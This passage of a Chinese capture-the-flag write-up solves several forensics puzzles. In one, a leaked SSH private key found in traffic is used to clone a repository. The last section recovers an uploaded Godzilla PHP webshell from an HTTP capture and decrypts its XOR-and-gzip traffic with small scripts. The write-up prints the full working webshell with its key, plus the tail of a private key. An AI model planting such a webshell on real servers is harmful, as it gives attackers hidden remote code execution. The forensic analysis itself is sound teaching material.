+<span class="nx">y5KrmkBznmEoNOoiTj5EG4jtoAZOdeh1FKePpxxANvGG4ehw2nSpHc</span><span class="o">+</span><span class="nx">BZ4dcKLTI6qPbGp</span>
+<span class="nx">rk0</span><span class="o">+</span><span class="nx">bUPslUZOmdEEwo0RD8gmPrwowVsTkTzkDb</span><span class="o">/</span><span class="mi">3</span><span class="nx">IUDg8dMFWn5C</span><span class="o">+</span><span class="nx">PGE27KD</span><span class="o">/</span><span class="nx">XFUMC1RgD</span>
+<span class="nx">xNWJwrLCER6DTbUceT54KTPgsOPJz0T9cNK0g0CjqobdiE5H2d16zORpOKdtYatfj9</span><span class="o">/</span><span class="nx">FC3</span>
+<span class="nx">RYExoL7yipkUcAAAANa2FsaUBFc29uaHVnaAECAwQFBg</span><span class="o">==</span>
+<span class="o">-----</span><span class="nx">END</span> <span class="nx">OPENSSH</span> <span class="k">PRIVATE</span> <span class="nx">KEY</span><span class="o">-----</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>流量包里面，第一个http流里面有这样的信息</p>
+<p><img src="https://img-blog.csdnimg.cn/edeeb19a1cd04d2daf8d7608ea046c44.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_18,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>所以接下来的目标就是利用这个私钥去拉取这个仓库
+把私钥文件丢到~./ssh里面
+然后用私钥去生成一个公钥</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">ssh</span><span class="o">-</span><span class="nx">keygen</span> <span class="o">-</span><span class="nx">y</span> <span class="o">-</span><span class="nx">f</span> <span class="nx">id_rsa</span> <span class="o">&gt;</span> <span class="nx">id_rsa</span><span class="o">.</span><span class="nx">pub</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>然后就可以clone了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">git</span> <span class="k">clone</span> <span class="nx">Esonhugh</span><span class="o">@</span><span class="nx">github</span><span class="o">:</span><span class="nx">Esonhugh</span><span class="o">/</span><span class="nx">secret_source_code</span><span class="o">.</span><span class="nx">git</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://img-blog.csdnimg.cn/36668b8687a24b67a7e5f64b9dee7926.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>里面的文件就是http的第一个包的服务，没有flag，那就看一下git log，果然发现了端倪</p>
+<p><img src="https://img-blog.csdnimg.cn/5beb99b8091e4c91affcb4ab466edb4b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_12,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>都看了一下，发现flag是在source1里面</p>
+<p><img src="https://img-blog.csdnimg.cn/1bc6af57511646f78a724d086646f1c0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_17,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><img src="https://img-blog.csdnimg.cn/76e21b3cc32f41c3b81a006cc3b69e52.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>DASCTF{Oh!_H4ck_f0r_c0d3s-and_4buse_1t}</p>
+<h2 id="月圆之夜">月圆之夜</h2>
+<p>其实就是找一个映射的关系
+比如机械师是mechanic，对应了他的字母，然后翻译出来对应回去就是了</p>
+<p><img src="https://img-blog.csdnimg.cn/5a34a6b94a5b41d69d03764942303c4d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>mechanic</p>
+<p><img src="https://img-blog.csdnimg.cn/58283126fef34daa9dbdfc31c287f988.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>werewolf</p>
+<p><img src="https://img-blog.csdnimg.cn/374191bfaf544df8a2aff830fda5dad1.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>magician</p>
+<p><img src="https://img-blog.csdnimg.cn/65429360175440579777f2d6b600312c.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>knight</p>
+<p><img src="https://img-blog.csdnimg.cn/563dbd3c011b45d98d14bd079abffccc.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>soul hunter</p>
+<p><img src="https://img-blog.csdnimg.cn/ec8d3d81040d4ac5b2de7fb350304820.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>n</p>
+<p><img src="https://img-blog.csdnimg.cn/4b85b40cf83f4425a7193fca47dccba7.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>witch</p>
+<p><img src="https://img-blog.csdnimg.cn/8b7c249e483a4e59bca4e1a4e6b2ed92.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>nun</p>
+<p><img src="https://img-blog.csdnimg.cn/d1f727671d654bdf811de45e20d381a8.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>apothecary</p>
+<p><img src="https://img-blog.csdnimg.cn/942a4e8ba9e9407988eb580f8254c5de.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>Ranger</p>
+<p><img src="https://img-blog.csdnimg.cn/b86c0cd3239e422ba8c3c1a4cdd9e350.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>对比一下flag</p>
+<p><img src="https://img-blog.csdnimg.cn/57bc3d8487064f6db1a8a1e89fb37d5d.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p><img src="https://img-blog.csdnimg.cn/d8a15be2b5164caea4c65c78f8d8345d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_19,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>dasctf{welcometothefullmoonnight}</p>
+<h2 id="什么奇奇怪怪的东西">什么奇奇怪怪的东西</h2>
+<p>打开有一个mrf文件，MRF 文件是由 Bartels Media Mouse Recorder 创建的数据文件</p>
+<p>还有一个flag.zip，里面有一个vhd文件，也被加密了</p>
+<p><img src="https://img-blog.csdnimg.cn/62c32d5690284d3bb077168224c974b3.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>在这里下载一个MouseRecorder
+<a class="link" href="https://www.macrorecorder.com/download/"  target="_blank" rel="noopener"
+    >https://www.macrorecorder.com/download/</a>
+这里记录了一些鼠标操作记录</p>
+<p><img src="https://img-blog.csdnimg.cn/78d21841883a4a909ad59810444b7e2b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>打开画图，然后让他画出来
+结果是397643258669</p>
+<p><img src="https://img-blog.csdnimg.cn/b6bafe2f513044c98e6d797bc02c4931.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>用这个密码去解开压缩包，拿到vhd文件，挂载上以后，里面有这么些文件</p>
+<p><img src="https://img-blog.csdnimg.cn/cae3d34c64a047d19b2af25c2324a35c.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>ppt里面有这么一段字符</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">9876543210/.-,+*)E&#39;CB;:?&gt;=&lt;;4Xyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONML
+</code></pre></td></tr></table>
+</div>
+</div><p>xlsx里面的内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">KJIHGFED</span><span class="sb">`B^]V[TYXWVUNrLQJONMLKDh+*)(&#39;&amp;&lt;A@?8=&lt;;:92Vwvutsrqponmlkjihgfedcba`</span><span class="nx">_</span><span class="o">^</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>txt里面的内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="err">&#39;</span><span class="o">&amp;</span><span class="nx">B</span><span class="err">$</span><span class="o">:?</span><span class="mi">8</span><span class="o">=&lt;</span><span class="p">;</span><span class="o">:</span><span class="mi">3</span><span class="nx">W76</span><span class="o">/</span><span class="mi">4</span><span class="o">-</span><span class="nx">Qrqponmlkjihgfedcbawv</span><span class="p">{</span><span class="nx">zyxwvutsl2poQmle</span><span class="o">+</span><span class="nx">LKJIHGcE</span><span class="p">[</span><span class="err">`</span><span class="nx">YX</span><span class="p">]</span><span class="nx">V</span><span class="p">[</span><span class="nx">ZSw</span><span class="o">:</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>看这个图片的16进制，在末尾接了一段数据，是png的反转89054e74</p>
+<p><img src="https://img-blog.csdnimg.cn/10b0b0d9299d4dd19d54972bea638d52.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>提取出来反转一下，解出来是半个二维码</p>
+<p><img src="https://img-blog.csdnimg.cn/7504d906522740d5836adefd09ff7302.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_10,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>原png的文件名解码是flag4</p>
+<p><img src="https://img-blog.csdnimg.cn/66ff6adb90fa4cebb2628f97b33258a9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_19,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<h2 id="au5t1n的秘密">Au5t1n的秘密</h2>
+<p>中间有http流，貌似是扫描了一下目录</p>
+<p><img src="https://img-blog.csdnimg.cn/63e5ed588af44c69978d608b21ad396f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>在1994组里面，貌似是扫到了后台</p>
+<p><img src="https://img-blog.csdnimg.cn/b0226c40ff6b45928e89c2996aa0dc72.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>这里用admin:admin貌似登陆进去了</p>
+<p><img src="https://img-blog.csdnimg.cn/6b5831c11df6438e89034def93ae76d8.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>进后台后进行了一个上传操作，这里提示了密钥是key is key1**</p>
+<p><img src="https://img-blog.csdnimg.cn/61d5b8c67b4547d5bb3b6863c2e61e37.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_18,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>传了文件名为key.php.mod
+第二次上传</p>
+<p><img src="https://img-blog.csdnimg.cn/276fd952482c4a3e9ee71c602ea66c30.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_19,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>内容是一个木马，didi.php，是一个哥斯拉马子，但是好像还改过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="o">@</span><span class="nx">session_start</span><span class="p">();</span>
+<span class="o">@</span><span class="nx">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="o">@</span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="k">function</span> <span class="nf">encode</span><span class="p">(</span><span class="nv">$D</span><span class="p">,</span><span class="nv">$K</span><span class="p">){</span>
+    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$D</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$K</span><span class="p">[</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span><span class="o">&amp;</span><span class="mi">15</span><span class="p">];</span>
+        <span class="nv">$D</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$D</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">^</span><span class="nv">$c</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$D</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nv">$payloadName</span><span class="o">=</span><span class="s1">&#39;payload&#39;</span><span class="p">;</span>
+<span class="nv">$key</span><span class="o">=</span><span class="s1">&#39;093c1c388069b7e1&#39;</span><span class="p">;</span>
+<span class="nv">$data</span><span class="o">=</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;php://input&#34;</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$data</span><span class="o">!==</span><span class="k">false</span><span class="p">){</span>
+    <span class="nv">$data</span><span class="o">=</span><span class="nx">encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="nv">$key</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$payloadName</span><span class="p">])){</span>
+        <span class="nv">$payload</span><span class="o">=</span><span class="nx">encode</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$payloadName</span><span class="p">],</span><span class="nv">$key</span><span class="p">);</span>
+		<span class="k">eval</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
+        <span class="k">echo</span> <span class="nx">encode</span><span class="p">(</span><span class="o">@</span><span class="nx">run</span><span class="p">(</span><span class="nv">$data</span><span class="p">),</span><span class="nv">$key</span><span class="p">);</span>
+    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="s2">&#34;getBasicsInfo&#34;</span><span class="p">)</span><span class="o">!==</span><span class="k">false</span><span class="p">){</span>
+            <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$payloadName</span><span class="p">]</span><span class="o">=</span><span class="nx">encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="nv">$key</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>继续往后翻，找到对这个后面的利用了</p>
+<p><img src="https://img-blog.csdnimg.cn/54daa06d6e194b25a7db27d04a0de578.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>被加密了，解一下哥斯拉的加密才行</p>
+<p><img src="https://img-blog.csdnimg.cn/ddfe5ee047db47c898a9e87f99eb370e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_18,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>写一个脚本逆一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">function</span> <span class="nf">encode</span><span class="p">(</span><span class="nv">$D</span><span class="p">,</span><span class="nv">$K</span><span class="p">){</span>
+    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$D</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$K</span><span class="p">[</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span><span class="o">&amp;</span><span class="mi">15</span><span class="p">];</span>
+        <span class="nv">$D</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$D</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">^</span><span class="nv">$c</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$D</span><span class="p">;</span>
+<span class="p">}</span>
+
+
+<span class="nv">$payloadName</span><span class="o">=</span><span class="s1">&#39;payload&#39;</span><span class="p">;</span>
+<span class="nv">$key</span><span class="o">=</span><span class="s1">&#39;093c1c388069b7e1&#39;</span><span class="p">;</span>
+<span class="nv">$data</span><span class="o">=</span><span class="s1">&#39;1d430243025e5d4c55444a5f56174351401b4a0a6e391c6763736a5f56174351401b4a0a6e395e4d5e554d0b580b11424c5d4b15135e4b114b3b3342174511425c7
+</span><span class="s1">。
+</span><span class="s1">。（省略）
+</span><span class="s1">。
+</span><span class="s1">70657304a4b4c555b7f1759061919023e69114f726d2d75726c656e636f6465640d0a436f6e74656e742d4c656e6774683a2031390d0a0d0a545617590c5776595d533b66376531445c4017&#39;</span><span class="p">;</span>
+<span class="k">echo</span> <span class="nx">encode</span><span class="p">(</span><span class="nx">hex2bin</span><span class="p">(</span><span class="nv">$data</span><span class="p">),</span><span class="nv">$key</span><span class="p">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://img-blog.csdnimg.cn/118d47d25e7347ccb8e0427499d6c2fe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+>
+解密拿到源码，这就是哥斯拉注入的一些东西，不用管</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$parameters</span><span class="o">=</span><span class="k">array</span><span class="p">();</span> <span class="nv">$_SES</span><span class="o">=</span><span class="k">array</span><span class="p">();</span> <span class="k">function</span> <span class="nf">run</span><span class="p">(</span><span class="nv">$pms</span><span class="p">){</span> <span class="nx">reDefSystemFunc</span><span class="p">();</span> <span class="nv">$_SES</span><span class="o">=&amp;</span><span class="nx">getSession</span><span class="p">();</span> <span class="o">@</span><span class="nx">session_start</span><span class="p">();</span> <span class="nv">$sessioId</span><span class="o">=</span><span class="nx">md5</span><span class="p">(</span><span class="nx">session_id</span><span class="p">());</span> <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$sessioId</span><span class="p">])){</span> <span class="nv">$_SES</span><span class="o">=</span><span class="nx">unserialize</span><span class="p">((</span><span class="nx">S1MiwYYr</span><span class="p">(</span><span class="nx">base64Decode</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$sessioId</span><span class="p">],</span><span class="nv">$sessioId</span><span class="p">),</span><span class="nv">$sessioId</span><span class="p">)));</span> <span class="p">}</span> <span class="o">@</span><span class="nx">session_write_close</span><span class="p">();</span> <span class="k">if</span> <span class="p">(</span><span class="nx">canCallGzipDecode</span><span class="p">()</span><span class="o">==</span><span class="mi">1</span><span class="o">&amp;&amp;@</span><span class="nx">isGzipStream</span><span class="p">(</span><span class="nv">$pms</span><span class="p">)){</span> <span class="nv">$pms</span><span class="o">=</span><span class="nx">gzdecode</span><span class="p">(</span><span class="nv">$pms</span><span class="p">);</span> <span class="p">}</span> <span class="nx">formatParameter</span><span class="p">(</span><span class="nv">$pms</span><span class="p">);</span> <span class="k">if</span> 
+<span class="nx">。</span>
+<span class="nx">。（省略）</span>
+<span class="nx">。</span>
+<span class="nx">strlen</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span> <span class="nx">array_push</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$string</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span> <span class="p">}</span> <span class="k">return</span> <span class="nv">$bytes</span><span class="p">;</span> <span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>再看看他其他的操作，这个流里面就是一些加载配置的操作了
+后面的包，流量就解不出了，不知道为啥
+他们有一个特征就是都有一个这样的头</p>
+<p><img src="https://img-blog.csdnimg.cn/71c766859461418cbcdd245f7c4c3e6d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_15,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>我怀疑是不是有一个什么格式，后来去了解了一下哥斯拉的木马，发现在Godzillas v3.03以后对发送以及返回流量增加了gzip压缩，我把脚本一改</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">function</span> <span class="nf">encode</span><span class="p">(</span><span class="nv">$D</span><span class="p">,</span><span class="nv">$K</span><span class="p">){</span>
+    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$D</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$K</span><span class="p">[</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span><span class="o">&amp;</span><span class="mi">15</span><span class="p">];</span>
+        <span class="nv">$D</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$D</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">^</span><span class="nv">$c</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$D</span><span class="p">;</span>
+<span class="p">}</span>
+
+
+<span class="nv">$payloadName</span><span class="o">=</span><span class="s1">&#39;payload&#39;</span><span class="p">;</span>
+<span class="nv">$key</span><span class="o">=</span><span class="s1">&#39;093c1c388069b7e1&#39;</span><span class="p">;</span>
+<span class="nv">$data</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="k">echo</span> <span class="nx">bin2hex</span><span class="p">(</span><span class="nx">encode</span><span class="p">(</span><span class="nx">hex2bin</span><span class="p">(</span><span class="nv">$data</span><span class="p">),</span><span class="nv">$key</span><span class="p">));</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>看一下文件头，哦豁，真是gzip压缩的格式</p>
+<p><img src="https://img-blog.csdnimg.cn/14cd602b6c2b410e94ececd247c286fe.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>这样就可以拉去<code>gzip -d</code>解压了</p>
+<p><img src="https://img-blog.csdnimg.cn/99edd18009274466a8ab4a1505f05d0a.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>解压出来，果然有数据！！</p>
+<p><img src="https://img-blog.csdnimg.cn/7109ea2f382c4e83b4385307201b03a3.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>然后就可以去试了</p>
+<p><img src="https://img-blog.csdnimg.cn/a6407cd3dbe944b7a28b2ff5ece9b754.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_16,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>在当前目录发现了flag.zip，时间还是2022的</p>
+<p><img src="https://img-blog.csdnimg.cn/22f640c6d76a4c8385e9fefb9c3253dc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_16,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>然后就是一个个的去试，在2079号包里面，找到了相关信息</p>
